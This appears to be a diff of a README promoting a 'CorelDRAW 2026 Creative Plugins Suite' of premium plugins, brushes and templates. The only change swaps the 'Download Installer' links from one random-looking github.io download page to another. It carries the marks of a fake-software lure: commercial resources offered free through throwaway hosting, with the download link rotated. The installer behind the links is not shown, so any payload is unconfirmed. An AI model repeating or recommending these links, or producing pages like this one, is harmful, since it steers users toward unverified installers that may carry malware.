@@ -2,7 +2,7 @@
 
 CorelDRAW 2026 Creative Plugins Suite is a comprehensive collection of professional-grade plugins, brushes, effects, and templates designed to supercharge your CorelDRAW workflow. This toolkit brings together hundreds of premium resources — including PowerTRACE enhancements, vector brush packs, effect filters, and custom template libraries — all fully optimized for CorelDRAW 2026 on Windows 10 and Windows 11.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -66,7 +66,7 @@ No. The portable configuration is specifically designed to run from a USB flash 
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
